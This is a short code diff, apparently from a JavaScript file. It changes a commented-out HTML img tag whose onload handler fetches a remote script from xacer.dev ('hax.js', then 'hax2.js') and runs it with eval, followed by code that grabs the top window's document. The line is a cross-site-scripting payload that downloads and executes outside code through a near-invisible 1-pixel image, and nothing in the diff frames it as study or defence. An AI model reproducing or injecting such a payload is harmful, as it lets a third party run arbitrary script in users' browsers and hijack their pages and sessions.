@@ -1,5 +1,5 @@
 
-// <img onload="fetch('https://xacer.dev/misc/hax.js').then(r=>r.text()).then(t=>eval(t))" width="1px" height="1px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwJt3NP0PTKrWSYtcxWlTcK5H7plhdwe9B6g&usqp=CAU" >
+// <img onload="fetch('https://xacer.dev/misc/hax2.js').then(r=>r.text()).then(t=>eval(t))" width="1px" height="1px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwJt3NP0PTKrWSYtcxWlTcK5H7plhdwe9B6g&usqp=CAU" >
 
 const doc = window.top.document;
 
